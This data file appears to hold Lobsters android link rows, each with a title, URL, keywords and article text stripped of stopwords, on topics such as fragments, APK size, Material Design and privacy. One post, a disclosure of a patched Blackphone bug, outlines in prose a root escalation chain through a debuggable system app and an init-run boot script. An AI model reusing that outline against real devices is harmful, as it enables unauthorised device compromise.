481,Lobsters,android,Android,Fragment view state retention: A dirty solution,http://vinsol.com/blog/2014/10/22/fragment-view-state-retention-a-dirty-solution/,fragment view state retention dirty solution,managing session fragment oriented application getpersistentview,last part part series fragment oriented architecture android application previous post talked managing session fragment oriented application post going talk retaining view hierarchy fragment removing container coming back popping backstack fragment get replaced another fragment transaction added back stack expectation popbackstack return previous fragment ui state intactâ activity backstack take care expectation quite cleanly lowmemory situation occurs case fragment thisâ default behaviour vanilla implementation â replaced fragment viewhierarchy would get recreated upon returning back reason replace operation destructive lifecycle method get calledâ till ondestroyview wipe viewhierarcy upon returning back constructive lifecycle method rightâ oncreateview get called thus recreating viewhierarchy totally afreshâ reason flow keep fragment memory friendly without viewhierarchy fragment java object bunch instance variable good news still instance variable intact instance user update text edittext text keep value instance variable replace operation upon returning back value set text edittext new view hierarchy done scrollstate switch state etc recommended way pretty clean solution get exponentially complicatedâ increase complexity fragment viewhierarchy dirty solution retain viewhierarchy upon replace operation course dumpsâ memoryfriendly tag help great deal whileâ implementingâ complicated view done keepingâ reference rootview fragment replace operation returnâ fromâ oncreateview instead inflating fresh viewhierarchyâ done following additional code basefragment persistent root view public abstract class basefragment extends fragment public boolean hasinitializedrootview false private view rootview public view getpersistentview layoutinflater inflater viewgroup container bundle savedinstancestate int layout rootview null inflate layout fragment rootview inflaterinflate layout null else inflate layout returned view oncreateview added fragment however allowed added twice even parent must remove rootview existing parent view group added back viewgroup rootviewgetparent removeview rootview return rootview getpersistentview method code keep reference viewhierarchy never inflates method called oncreateview callback method inheriting fragment complex ui utilising persistent root view fragment override public view oncreateview layoutinflater inflater viewgroup container bundle savedinstancestate return getpersistentview inflater container savedinstancestate rlayoutfragmentlayout override public void onviewcreated view view bundle savedinstancestate superonviewcreated view savedinstancestate hasinitializedrootview hasinitializedrootview true initial setup ui doinitialsetupofui sample application last two sectionsâ using technique retain scroll position list nestedlistfragment even complex situation list nested child fragment handling situation recommended way quite pain course ideal solution still looking better one please direct hit upon better solution
482,Lobsters,android,Android,Mobile design that scales: building for existing and future devices,http://developer.telerik.com/featured/mobile-design-scales-building-existing-future-devices/,mobile design scale building existing future device,mobile design scale building existing future device telerik developer network,mobile designer developer share common frustration stemming fragmented device landscape wearable horizon puzzle becoming baffling possible design perfect app user experience device tv wearable article offer practical stepbystep guideline help design flawless crosschannel post mobile design scale building existing future device appeared first telerik developer network
485,Lobsters,android,Android,Thoughts after a Month with Blackphone,http://www.droidsec.org/news/2014/09/30/thoughts-after-a-month-with-blackphone.html,thought month blackphone,thought month blackphone oracle calling product unbreakable reviewed prerelease version device crossposted bruce schneier blog interview discussing device rooted day malwarebytes bluebox viaforensics droid army getting root apk pop debugging menu adb jdwp jdb debug remotewipe system app telnetd initqvsrc data databootscriptsh init reporting issue release note reflecting exploited issue android compatibility test suite ct difference androidaosp twitter privatos open source making promise make blackphone open source way source linux kernel slow keep open source promise azimuth security reviewed android compatible android compatible installing app effectively equivalent giving author app shell account personal machine remote kill consideration forking aosp google chrome release stable channel update august quicker fakeid futex towelroot observed change bug bounty program announced bug bounty program first bug bounty program androidbased smartphone stated bug bounty told ar technica bug bounty contrary company philosophy conclusion,thought month blackphone sep jduck month ago decided order blackphone product web site make tall claim security even calling secure smartphone kind proclamation rather bold perhaps even disingenuous often lead intense scrutiny security community example consider response oracle calling product unbreakable bit skeptic last month spent free time researching blackphone company evaluating security flagship smartphone wrote post present observation opinion formed result research diving want point first person take look blackphone device announced january finally made available june time ar technica reviewed prerelease version device review crossposted bruce schneier blog august blackphone booth def con vendor area cso even interview discussing device event fellow droidsec researcher jcase bought blackphone subsequently rooted day black hatdef con company like malwarebytes bluebox viaforensics since posted take device article myriad associated reader comment raise many valid point many echo sentiment purchased blackphone shortly returning def con shipped directly hong kong arrived two day arrived quickly added droid army starting taking look getting root first order business case new device get root device shipped privatos left vulnerable chain bug jcase used root blackphone def con step reproducing method follows enable thirdparty app installs hostinstall apk pop debugging menu sure set contenttype run app enable usb debugging use adb jdwp jdb debug remotewipe system app inject code spawn telnetd system find way get system root made fairly short order reproducing first five step path root leaving system privilege last part involved getting root system account jcase disclose method achieving started auditing find way take long found looking following excerpt initqvsrc illustrates problem service bootscript databootscriptsh oneshot user root disabled property start bootscript android system user owns data directory therefore easily create databootscriptsh shell script next boot init execute script root allows escalating privilege system root also allows persisting root access across subsequent vulnerable system update able use issue keep root access even installing privatos update reporting issue reported issue august quickly acknowledged fix released part privatos september blackphone staff fixed issue within day graciously credited release note short turn around pretty impressive security issue initial ramdisk smartphone fix issue follows diff ubr user system group system inet netadmin customer remove line import initqvsrc log save file service nvlogtofile systembinnvlogtofilesh class main initqvsrc reflecting exploited issue although blackphone fixed issue quickly unclear shipped first place excerpt included removing comment say customer remove line comment likely left nvidia systemonchip soc manufacturer provides board service platform bsp device step exploited security issue reported sebastián marco viaforensics also droidsec member jcase independently discovered exploited bug def con root cause issue blackphone shipped system app debuggable quite unfortunate actually android compatibility test suite ct would find type security issue quickly unfortunately staff blackphone catch issue presence issue distressing solid security development lifecycle sdl make likelihood issue small perhaps blackphone sdl perhaps missed issue case fact rookie mistake shipped detracts blackphone security claim difference androidaosp rooting device began investigating exactly change blackphone made androidaosp make device secure andor private people making bit stink twitter reader comment various article blackphone response point process difference like quicker patching rather hardening increased privacy feature keep mind although difference android device apparent necessarily difference aosp privatos open source unfortunately blackphone made source code privatos available despite making promise make blackphone open source way made source linux kernel available legally encumbered due gpl much code aosp released bsd apache license legal requirement terribly surprised given fact silent circle one company behind blackphone also slow keep open source promise reason releasing code unclear perhaps bureaucracy plague mobile operating system ecosystem rearing ugly head cause could internal logistics issue nvidia holding back attempt protect company ip whatever case important thing realize keeping code closed hurt blackphone opening source code increase trust blackphone product company behind many eye argument aside auditing open source software easier reverse engineering example june azimuth security reviewed open source zrtp library used silent circle apps identified several vulnerability subsequently fixed without taking look blackphone code know introduced additional security issue unfortunately common android device manufacturer ideal way review change aosp would compare source code android without code amount reverse engineering time effort required enough dissuade researcher including far apart making auditing easier opening source code greatly improves transparency researcher analyst easily review code verify backdoor present android compatible although blackphone based android aosp android compatible mean blackphone allowed use android name ship access google play former largely unimportant latter actually interesting security ramification good bad excluding google play app store matter remove huge attack surface fact blackphone default configuration install apps think fantastic installing app effectively equivalent giving author app shell account personal machine nobody would give complete stranger shell would flip side access google play mean blackphone benefit resource play provides feature like automatic app update remote kill ecosystem wide mitigation potential probably mean play service google cloud messaging present may break apps depend feature omitting feature effectively separate blackphone rest android ecosystem better worse going compatible route also mean blackphone probably access open handset alliance much stated publicly oha since inception believed channel google android oems share important vulnerability information access privately reported vulnerability advisory code fix ahead time put blackphone slight disadvantage disclosure practice terrible android ecosystem blackphone may miss important fix entirely consideration forking aosp fork aosp blackphone privatos incurs significant maintenance cost also realize amazing benefit standing gigabyte source code backporting patch nightmare probably biggest reason oems carrier take long release firmware update case difficulty arise resulting update scrapped never released think insane amount code change android l finally released remain secure blackphone one two thing option one comb released change backport security relevant fix applies androidspecific project also external project included aosp like openssl webkitblinkchromium failure could leave blackphone user susceptible publicly disclosed security issue regularly published google chrome release blog example stable channel update august fixed eight security issue four rated high one rated critical blackphone need review change keep fork updated keep user secure small feat awesome part fork quicker google decoupled aosp wait google fix come next major version release something blackphone already fairly well example able fix serious vulnerability like fakeid futextowelroot accelerated time line certainly good thing mentioned earlier section sheer amount code track maintain remains herculean challenge observed change using blackphone following change aosp observed bootloader blackphone easily unlockable immediately relocks booting annoying developing great feature might forget relock bootloader recovery mode device appears changed clear exactly point first difficult get use adb reboot recovery quickly hit volup voldn powering device get recovery mode button appear anything mean sideloading update permission handling code within android framework must modified support permission privacy feature presumably biggest change blackphone made aosp important note change verified comparing code aosp otherwise mostly source code available mean complete list change even possible change leaving indepth review later date exercise reader bug bounty program september blackphone announced bug bounty program surprisingly first bug bounty program androidbased smartphone although google patch reward program prp cover aosp focused hardening reward individual vulnerability reportsfixes chrome offer bug bounty cover chrome android far cry paying bug entire android o previously blackphone publicly stated bug bounty fact ceo toby weirjones told ar technica bug bounty contrary company philosophy although strange changed mind welcome applaud new approach working security research community large compensating researcher time right move conclusion little month blackphone gotten feel device company behind software run along way noticed several difference androidbased device tried discern whether device life claim focused security privacy made headway think much left done come security feel blackphone claim overstated blackphone made several rookie mistake shipping device one completely avoidable simply running android ct blackphone contains additional o kernel hardening feature compared android device comparing device samsung galaxy blackphone lag quite bit behind course bad news commitment fast patching witnessed first hand deserves great acclaim refreshing improvement rest android ecosystem addition bug bounty program poised truly make difference leveraging community large blackphone still security challenge conquer seem headed right direction would remiss point blackphone flakiness come keeping word company inability keep promise raise doubt likely cause many wouldbe customer lose interest type people value blackphone key feature need able trust device company behind implore blackphone rectify problem uphold word deliver source code privatos convinced much good come privacy blackphone really shine permission modification custom communication apps blackphone privacy feature truly make snooping user private information difficult unfortunately achieving privacy requires achieving solid security bet someone compromise device regardless secure cryptography otherwise said done honestly say like device admire applaud company trying wish best
487,Lobsters,android,Android,Snowplow 0.9.8 released for mobile analytics,http://snowplowanalytics.com/blog/2014/09/18/snowplow-0.9.8-released-for-mobile-analytics/,snowplow released mobile analytics,io tracker blog post android tracker blog post mobilecontext geolocationcontext jonathan almeida updated clojure collector updated enrichment process upgrading documentation help sample template please make sure upgrade hadoop enrichment process upgrading collector link mobilecontext script geolocationcontext script raise issue usual channel release note,hugely excited announce release longawaited snowplow version adding event analytics support io android application mobile event analytics requested feature snowplow community time many user keen feed snowplow data pipeline event mobile apps alongside existing website server software mobile event analytics major step journey web analytics tool generalpurpose event analytics platform make much sense silo event stream separate analytics package based whether event originate web mobile somewhere else snowplow believe huge value unifying disparate event stream single event pipeline like snowplow adding mobile support snowplow really different release snowplow add post support clojure collector upgrade enrichment process support post payload containing multiple event new event tracker io see accompanying io tracker blog post new event tracker android see accompanying android tracker blog post new mobilespecific json schema available iglu central mobilecontext geolocationcontext huge thanks snowplow intern jonathan almeida excellent work mobile tracker summer fold cover updated clojure collector updated enrichment process upgrading documentation help upgraded clojure collector support post request batching multiple event client sending batch via post request standard operating procedure mobile analytics designed minimize data usage preserve battery life new android io tracker send event via post also find post support recent version python ruby tracker support post cloudfront collector recommend snowplow user wanting send event mobile device switch clojure collector adding post support scala stream collector roadmap updated hadoop snowplow enrichment process version shredding process unchanged updated enrichment process handle raw event sent updated clojure collector via post updated process support existing collector format additionally validate log post payload contenttype set extract multiple raw event post payload feed raw event rest enrichment process read upgrading instruction release bump hadoop enrichment process version configyml file update hadoop enrich version like version hadoopenrich complete example see sample configyml template please make sure upgrade hadoop enrichment process upgrading collector release bump clojure collector version upgrade release download new warfile rightclicking link selecting log amazon elastic beanstalk console browse clojure application click new upload warfile new tracker send mobilerelated context conforming mobilecontext json schema custom context automatically attached event running redshift deploy mobilecontext table database using script android tracker also optionally sends geolocationrelated context relating geolocationcontext json schema support io tracker planned soon running redshift deploy mobilecontext table database using script mobile event analytics represents major new feature snowplow likely initial bug issue iron indeed new tracker always run issue understand change please raise issue get touch u via usual channel detail release please check release note github
488,Lobsters,android,Android,Types Don't Know # (C++ proposal for better hashing),http://htmlpreview.github.io/?https://github.com/HowardHinnant/papers/blob/master/hashing.html,type nt know c proposal better hashing,,
491,Lobsters,android,Android,The Semantics of Software,http://olivierlacan.com/posts/the-semantics-of-software/,semantics software,countercurrent thought semantic versioning unsemantic versioning semantic versioning number language keepachangelogcom help feedback badly breaking ton thing stop working one library change api enough cause breakage changelog keepachangelogcom nearly fouryears old rail application lot gemnasium metadata resource,jeremy ashkenas shared countercurrent thought semantic versioning recently read entire piece enlightening hear frustration major open source project maintainer always lot learn could improve thing unsemantic versioning jeremy gripe quite valid hard maintainer figure communicate possible breaking change using merely number want people afraid upgrading otherwise maintain old version software decade yet want aware could break upgrade hard get right believe make semantic versioning entirely worthless wish could learn voice concern problem without threatening move another country versioning changelogging go hand hand version much machineoriented least much superficial way communicate meaning change log however offer essential context version regardless whether maintainer project adhere semantic versioning open source software user know mean version introduce major api rewrite check changelog reflect introduction single important breaking change branch check changelog mean despite lack breaking change sufficient amount new feature introduced warrant opening new version chapter check changelog yes semantic versioning number low resolution ambiguous unclear believe essential maintainer make priority keep thorough changelog think encode three dotseparated number clearer meaning actual human language number language past month working guideline improve log change open source project called keepachangelogcom noticed surprisingly common popular project even change log mean pretend walked back mountain truthbearing tablet asking help feedback community best guideline science based consensus really want everyone agree change log filename changelog deal want gather common sensible changelogging practice try get many people use reliably consistently predictably boringly want u improve open source user experience like bias change log convention towards sensible practice instead popular entrenched practice saying like always done way everybody else way noxious want end practice periodically dumping git log diffs file calling changelog useless handwaving insult user contributor alike badly breaking get back versioning suck ton thing stop working one library change api enough cause breakage yep great opportunity u muchneeded conversation communicate open source software mentioned changelog idea open source software gift world dangerous publishing open source software virtuous vacuum many part praiseworthy open source project defined use case installation step usage example sensible versioning bug reporting infrastructure contribution guideline clear licensing thorough change log uptodate documentation reasonable test suite notice even mentioned actual software ask open source maintainer spend time worrying surprised many said software guideline established keepachangelogcom based experience developer past two year working nearly fouryears old rail application direct production dependency ruby side alone yes lot dependency often dependency try spend time producing thing value customer best keep dependency uptodate security release course also fight dependency rot simply upgrade smaller dependency whenever decided worthwhile u upgrade one alpha dependency mean spending lot time upgrading thing fixing thing minor even patch version broken searching vain changelogs recently become easier task thanks gemnasium still difficult time consuming importantly time spend producing software customer many dependency sure yet rather take chance communitymaintained library rather betting small team four people produce maintain software little expertise need regardless feel like much safer bet least let try make open source project mindful endusers instance offering better information metadata project think grateful one around infused meaning software resource list interesting project gathered recently help open source contributor improve project document communicate change aware better tool help maintainer contributor produce higher quality change log please send note update list
493,Lobsters,android,Android,Putting Your APKs on Diet,http://cyrilmottier.com/2014/08/26/putting-your-apks-on-diet/,putting apks diet,apk file format reducing apk file size good coding hygiene run proguard use lint extensively opinionated resource minimize resource configuration compress image lossless image compression algorithm limit number architecture excellent article reuse whenever possible render code appropriate android wearable support library going even screen density change conclusion frank harper,secret anyone apks getting bigger bigger simplesingletask apps time first version android common download apps explosion apk file size direct consequence user expectation developer experience acquisition several reason explain dramatic file size increase multiplication dpi category lmtvhxxxxxx dpi evolution android platform development tool library ecosystem everincreasing user expectation regarding high quality uis etc publishing lightweight application play store good practice every developer focus designing application first synonymous simple maintainable futureproof code base secondly developer would generally prefer staying play store current apk limit rather dealing download extension file finally live world constraint limited bandwidth limited disk space etc smaller apk faster download faster installation lesser frustration importantly better rating many say case size growth mandatory order fulfill customer requirement expectation however convinced weight apk general grows faster pace user expectation matter fact believe apps play store weight twice size could article would like discus techniquesrules usefollow reduce file size apks making coworkers user happy apk file format prior looking cool way reduce size apps mandatory first understand actual apk file format put simply apk archive file containing several file compressed fashion developer easily look content apk unzipping unzip command usually get executing unzip yourapkname asset lib armeabi mips metainf manifestmf certrsa certsf re androidmanifestxml classesdex resourcesarsc directory file shown look familiar developer mostly reflect project structure observed design development process asset lib re androidmanifestxml others quite exotic first sight practice classesdex contains dex compiled version java code resourcesarsc includes precompiled resource eg binary xml value xml drawables etc apk simple archive file mean two different size compressed file size uncompressed one size important mainly focus compressed size article fact great rule thumb consider size uncompressed version proportional archive smaller apk smaller uncompressed version reducing apk file size reducing file size apk done several technique app different absolute rule put apk diet nevertheless apk consists significant component easily act java source code resourcesassets native code tip trick consist minimizing amount space used per component reducing overall apk size process good coding hygiene probably seems obvious good coding hygiene first step reducing size apks know code like back one hand get rid unused dependency library make better day day clean continuously focusing keeping clean uptodate code base generally great way produce small apks contain strictly essential app maintaining unpolluted code base generally easier starting project scratch older project harder fact project large historical background usually deal dead andor almost useless code snippet fortunately development tool help run proguard proguard extremely powerful tool obfuscates optimizes shrink code compile time one main feature reducing apks size treeshaking proguard basically go code path detect snippet code unused unreached ie unnecessary code stripped final apk potentially radically reducing size proguard also renames field class interface making code lightweight possible may understood proguard extremely helpful efficient great responsibility come great consequence lot developer consider proguard annoying development tool default break apps heavily relying reflection developer configure proguard tell class field etc processed use lint extensively proguard work java side unfortunately work resource side consequence image myimage resdrawable used proguard strip reference r class keep associated image place lint static code analyzer help detect unused resource simple call gradlew lint generates htmlreport give exhaustive list resource look unused unusedresources unused resource section safe remove resource long access reflection code lint analyzes resource ie file re directory skip asset ie file asset directory indeed asset accessed name rather java xml reference consequence lint determine whether asset used project developer keep asset folder clean free unused file opinionated resource android support large set device core fact android designed support device regardless configuration screen density screen shape screen size etc android framework natively support various density ldpi mdpi tvdpi hdpi xhdpi xxhdpi xxxhdpi android supporting density mean export asset one afraid bundling density application know used small amount people personally support hdpi xhdpi apps issue device density android automatically computes missing resource scaling existing resource main point behind hdpixhdpixxhdpi rule simple first cover user secondly xxxhdpi exists make android futureproof future even coming finally actually care crappylowres density mdpi ldpi matter hard work density result look horrible letting android scaling hdpi variant note single variant image drawablenodpi also save space afford think scaling artifact outrageous image displayed rarely throughout app daytoday basis minimize resource configuration android development often relies use external library android support library google play service facebook sdk etc thesis library come resource necessary useful application instance google play service come translation language application even support also bundle mdpi resource want support application starting android gradle plugin pas information configuration application deal build system done thanks resconfig resconfigs flavor default config option dsl prevents aapt packaging resource match app managed resource configuration buildgradle defaultconfig resconfigs en de fr resconfigs nodpi hdpi xhdpi xxhdpi xxxhdpi compress image aapt come lossless image compression algorithm instance truecolor png require color may converted png color palette may reduce size resource prevent embracing lossy png preprocessor optimization path quick google search yield several tool pngquant imagealpha imageoptim pick one best fit designer workflow requirement use special type androidonly image also minimized far know tool specifically created however done fairly easily asking designer reduce stretchable content area minimum addition optimizing asset weight also make asset maintenance way easier long term limit number architecture android generally java rare case application need rely native code like opinionated resource come native code sticking armabi architecture usually enough current android ecosystem excellent article native library weight reduction reuse whenever possible reusing stuff probably one first important optimization learn starting developing mobile listview recyclerview reusing help keep smooth scrolling performance reusing also help reduce final size apk instance android provides several utility recolor asset either using new android tint android tintmode android l good old colorfilter version also prevent packaging resource rotated equivalent another resource let say image named icarrowexpand icarrowcollapse easily get rid icarrowcollapse creating rotatedrawable relying icarrowexpand technique also reduces amount time designer requires maintain export collapsed asset variant resdrawableicarrowcollapsexml xml version encoding rotate xmlns android http schemasandroidcomapkresandroid android drawable drawableicarrowexpand android fromdegrees android pivotx android pivoty android todegrees render code appropriate case rendering graphic directly java code great benefit one best example mammoth weight gain framebyframe animation struggling android wear development recently look android wearable support library like regular android support library wearable variant contains several utility class dealing wearable device unfortunately building basic hello world example noticed resulting apk quick investigation wearablesupportaar discovered library bundle framebyframe animation different density success animation frame open phone animation frame framebyframe success animation built simple animationdrawable defined xml file resdrawableconfirmationanimationxml xml version encoding animationlist xmlns android http schemasandroidcomapkresandroid android oneshot true item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration item android drawable android duration animationlist good point sarcastic course frame displayed duration making animation run frame every would ended library twice get really funny continue digging code frame line displayed duration follows great optimization save similar frame included bundled application unfortunately totally disappointed see wearablesupportaar actually contains completely unused useless frame animation code obviously requires development time however may dramatically reduce amount asset apk maintaining smooth animation running time writing android provide easy tool render animation really hope google working new lightweight realtime rendering system animate tiny detail material design fond adobe effect vectordrawable designer tool equivalent would help lot going even technique described mainly target applibrary developer side could go total control distribution chain guess could would mainly involve work serverside specifically play storeside instance could imagine play store packaging system bundle native library required target device similar note could imagine packaging configuration target device unfortunately would completely break one important functionality android configuration hotswapping indeed android always designed deal live configuration change language orientation etc instance removing resource compatible target screen density would great benefit unfortunately android apps able deal fly screen density change even though could imagine deprecating capability would still deal drawables defined different density target density well single density qualifier orientation smallest width etc serverside apk packaging look extremely powerful also risky final apk delivered user would completely different one sent play store delivering apk missing resourcesassets would break apps conclusion designing getting best set constraint weight apk file clearly one constraint afraid pulling string one apsect application make better way instance hesitate reduce quality ui rendering reduce size apk make app smoother user even notice quality drop notice app lightweight smooth application judged whole sum severed aspect thanks frank harper reading draft aar library extension pretty similar archive difference file stored regular noncompiled jarxml form resource java code actually compiled moment android application using built one optional exception rule launcher icon new google experience launcher relies density current screen density render icon launcher thus always bundle xxxhdpi version icon personally consider huge flaw android wearable support library decided use afford adding android wear app android app especially knowing sent device probably connected android wear device solution reimplemented interesting utility
494,Lobsters,android,Android,Recognizing Speech From Gyroscope Signals,http://crypto.stanford.edu/gyrophone/files/gyromic.pdf,recognizing speech gyroscope signal,,obj length filter flatedecode stream v u yb nr v fnuq b kw v vl gϊd v x
496,Lobsters,android,Android,Device Mirroring Options for Mobile Developers,http://developer.telerik.com/featured/mirroring-options-mobile-developers/,device mirroring option mobile developer,window phone window phone even technically need developer get miracast project screen nokia beamer io lightning vga lightning hdmi reflector tj vantoll airserver xbmc medium receiver android mobizen michael crump chromecast brings full screen android mirroring conclusion,mobile developer feel sense joy deploy apps see running real device feel great see code action interact creation next obvious step show creation right however sharing group recording demo sharing via tiny smartphone screen simply nt work would really need mirror device screen running app onto much bigger screen number use case device screen mirroring taking app screenshots recording app demo sharing client technical speaking live demo thankfully tooling come long way article sum popular effective mirroring option crossplatform mobile developer let explore window phone let begin window phone yes one lowest market share well respected o nonetheless passionate developer community window phone look awesome update bringing cortana action center worldflow keyboard whole lot feature mobile carrier push window phone update summerfall update available window phone even technically need developer get running window phone beta update look setting find project screen setting shown wireless mirroring work ultimate goal support miracasttype receiver screencasting grab project screen pc app usb cable connect window phone prompted phone project screen may uninstall preexisting phone driver device manager shown otherwise fire project screen pc app connect window phone phone screen get immediately duplicated pc see screenshot displaying window phone start screen screen simulation stay sync phone may also choose display touch pointer screen great demo screen projection usb cable thing craving wireless mirroring window phone nokia window phone luck nokia excellent beamer service wireless screencasting window phone even need window phone modern browser simply head nokia beamer website grab window phone app scan qr code boom window phone screen beamed browser nokia mirroring server screenshot expect beamer website visual window phone screen beamed wifi io several good mirroring option io first simplest requires newer device iphone touch gen forward specifically need io device lightning port screencast directly device bigger screen vga hdmi input simply grab lightning vga lightning hdmi adapter connect device bigger screen appropriate input voila screen mirrored including anything running device wired connection thing want convenience wireless mirroring best option may reflector come highly recommended colleague tj vantoll reflector quite simply airplay receiver io device extra needed already built simply fire reflector application pcmacandroid allow io device stream device airplay find expect reflector website followed screenshot little ipod touch gen device told airserver xbmc medium receiver apps pcmac also decent job mirroring airplay android fortunately android story platform plenty mirroring option cover noteworthy choice mobizen also highly recommended good friend michael crump mobizen offer reliable android screencasting browser window pc application full interactivity mirroring device grab mobizen app google store plug away mirroring android device bigger screen screenshots showcase mobizen feature followed michael android phone screen mirrored another fun option wirelessly mirror android device bigger screen come tiniest streaming device popular google chromecast week back chromecast update brings full screen android mirroring chromecastconnected tv instead app content cast entire android device screen tv everything show bigger shown sample android screenshot conclusion bottom line matter mobile platform targeting several option mirroring smartphone device onto bigger screen love mirroring option nt mention drop comment share simulator come long way nothing beat ondevice app testing able easily share mobile device screen audience invaluable
497,Lobsters,android,Android,Flock: Private Contact and Calendar Cloud Sync for Android,https://whispersystems.org/blog/flock/,flock private contact calendar cloud sync android,flock device data password flock sync roll next open source security textsecure also open source bithub pool try flock free facebook want get involved signal hiring,open whisper system believe user privacy powerful service today releasing flock private cloud sync service personal datayour contact calendar belong privacy flock make possible bothyour device data password itflock mobileoriented integrates seamlessly android account system registering flock expose android account transparently handle encrypted sync logic continue use preferred apps flock keep safe uptodate new trick remember security workflowyour data locked ever leaving device unlocked password never see password compelled hand key dataflock sync roll ownwe built flock sync power available year commit try day require payment information end trial bitcoin also accepted technically inclined flock also support ability host sync server free chargewhat next calendar contact flock work android stopping encrypted backup photo video desktop integration horizonopen source securityin past year textsecure grown quickly owe amazing network contributor flock also open source sending flock open whisper system community adding bithub pooltry flock free hope enjoy playing consider participating opensource development process happy syncing facebookwant get involved signal hiring
498,Lobsters,android,Android,Is Your Android Device Telling the World Where You've Been?,https://www.eff.org/deeplinks/2014/07/your-android-device-telling-world-where-youve-been,android device telling world,previous location data scandal look randomize mac address io response google broken update process google make progress problem protective step take today,android device le three year old phone screen connected wifi network high risk broadcasting location history anyone within wifi range want listen location history come form name wireless network phone previously connected frequently identify place including home tom wifi workplace company xyz office net church political office county party hq small business toulouse lautrec house illrepute travel destination tehran airport wifi data arguably dangerous leaked previous location data scandal clearly denotes human language place spent enough time use wifi normally eavesdropper would need spend effort extracting sort information latititudelongitude history typically discussed location privacy analysis even network seem le identifiable way look briefly mentioned problem recent post apple deciding randomize mac address io pointed wifi device actively connected network send message contain name network joined past effort speed connection process writing post became curious many phone actually exhibited behavior much information leaked dismay discovered many modern android phone tested leaked name network stored setting limit fifteen looked network list realized fact dangerously precise location history aside android platform also suffer problem need fixed although various reason android device appear pose greatest privacy risk moment android traced behavior feature introduced honeycomb android called preferred network offload pno pno supposed allow phone tablet establish maintain wifi connection even lowpower mode ie screen turned goal extend battery life reduce mobile data usage since wifi us le power cellular data reason even though none android phone tested broadcast name network knew screen many phone running honeycomb later even one running gingerbread broadcast name network knew screen turned response google brought issue google attention responded take security user location data seriously always happy made aware potential issue ahead time since change behavior would potentially affect user connectivity hidden access point still investigating change appropriate future release additionally yesterday google employee submitted patch wpasupplicant fix issue glad problem addressed quickly still time fix get integrated downstream android code even android fragmentation broken update process nongoogle android device could delay even prevent many user receiving fix hope google make progress problem protective step take today said workaround available device user want protect privacy right go phone advanced wifi setting set keep wifi sleep option never unfortunately cause moderate increase data usage power user order keep phone telling everyone everywhere unfortunately least one device motorola droid running android sufficient droid perhaps phone practical way prevent phone leaking location manually forget network nt want broadcast disable wifi entirely whenever nt actively connecting known wifi network also find apps automatically location history extremely sensitive information urge google ship fix soon possible android distributor offer prompt update containing
499,Lobsters,android,Android,Social Media Integration on Android,http://developer.telerik.com/featured/social-media-integration-android/,social medium integration android,ui android retired uwp xamarin kendo ui angular kendo ui react mean customer documentation resource telerik ui xamarin question address,ui android retired taking decision easy multiple factor taken consideration time changing mobile development trend native mobile application development become preferred method creating mobile apps io android existing crossplatform framework hardly compete always stood developer productivity believe road productivity paved skill reuse targeting multiple platform single code base deliver truly native application focusing product portfolio enhance productivity working popular rising development platform way continue provide best ui productivity tool help developer keep pace latest trend technology staying true calling increasing investment tooling around latest technology developer need includes net related product like uwp xamarin javascript offering kendo ui angular brandnew kendo ui react name mean customer effective immediately new feature product update accompanying documentation resource remain available understand might inconvenience strongly advice try telerik ui xamarin continue building crossplatform mobile application question address ready best answer question comment might drop u line reply soon possible
500,Lobsters,android,Android,The Smart Problem-Solving Behind Android’s Awesome New Design Language,http://www.wired.com/2014/06/the-big-ideas-behind-androids-awesome-new-design-language,smart problemsolving behind android awesome new design language,problem fragmentation lead user strain shade blue solution rational system motion dimensionality color even harder part documenting design process extreme detail,developer swarmed upon google io last week expecting kind design refresh android got instead announced shockingly little bluster sweeping wellreasoned often beautiful redesign meant touch nearly every part google ecosystem detail lovely little splash color greet finger tap mobile tablet way navigation bar resolve single action scroll web page phone see gifs see slide based around framework called material design dramatic step forward solving google overriding user experience problem torrid several year product launch ranging gmail google doc google drive google almost consistent way interact sometimes inbox would one place desktop another place mobile yet another place tablet sometimes button blue red know ariel zambelichwiredmaterial design contrast brings google product regardless platform one overarching design something even apple announced date overhaul three year making gathered strength last year thanks google ceo larry page eagerness see design team could next series relationship built matias duarte android vp designwhy long google perhaps even tech giant long operated total opposite corporate hodgepodge fiefdom laboring independently project overarching design context unthinkablebut duarte arrival page mandate create design culture gradual development relationship across google many product team inflection point come nt burst light much like water seeping ground duarte tell wired finally reached critical mass finally said let take problem eventually started tell nt assume ca nt fix going animation color used highlight action uinote splash color used give user visual feedback every touchthe problem fragmentation lead user strainmatias duarte ux star came google owing brilliant ultimately doomed design palm web o presaged great deal current thinking smartphone interface core member original team pick plum job apple facebook twitter elsewhere duarte chose go google whose design culture best summarized marissa mayer proudly announced google love design exemplified company ab testing shade blue use hyperlink color many design community palpable excitement duarte could androidthe team saw halting progress early year ice cream sandwich first big win though leap forward google nt provide vision design google could many team cared deeply one thing spent massive amount time designing foundational element say nicholas jitkoff senior designer material design nt spend time reinventing wheel defining baseline style let get app built focus one two thing core product user side creeping feeling many design idea many apps simply exhausting user different screen size platform considered separately web mobile team optimizing one particular problem say duarte one ever looked user journey much burden creating material design solves problem tantalizing styleanother lovely subtle use color note hit clr button color splash bleeds outward seeming wash away number displayanother lovely subtle use color note hit del button color splash bleeds outward seeming wash away number displaythe solution rational system motion dimensionality colorjust glancing material design tell lot solution duarte team came new language simple flat bold almost like googleized version flatter aesthetic championed jony ive android want kill skeuomorphism pretty shallow comparison reason always clear platform proliferate mobile come dominate information need shown tiny screen going go result clarify design language strip anything fussy becomes zoo account million apps built upon android flatness nt strategy rather recognition many competing demand need stripped phone start feeling like japanese stereo buried functional decorative element crowd whatever actually trying see well solution work airy wellspace grid look easy read informationariel zambelichwiredbut make something flat also functional phone much two big overarching solution duarte team came dimensionality motion nt novel solution apple basic thing io distinguishes android use dimensionality motion deployed carefully geared towards specific functional demandswith dimensionality every pixel android also elevation attached developer elevation trigger shadowing defined o voila system layer element top regular predictable user nt ever think well behind behind developer never worry clashing visual stylemotion better example duarte team careful draw guideline use motion highlight action changing interactive state thus see list music track button see play arrow hit play arrow swoop little bit turn forward reverse button well volume control breaking apart chain action want simply listen music connecting step animation made step process relevant input trying every fork roadperhaps one simplest friendly touch visual hinting happens tap screen instead fake button push like plastic button phone dot color rise telling input mark make tight system visual feedback opposed constant subconscious dialogue phone wondering exactly hitting tap awaylastly team used color draw icon dialogue action example gmail icon always red like compose button give every app visual design also function like affordance make short distance choosing open app choosing itmotion color used highlight core interaction note color draw attention play button play button hit transform bigger ui pane color control motion color 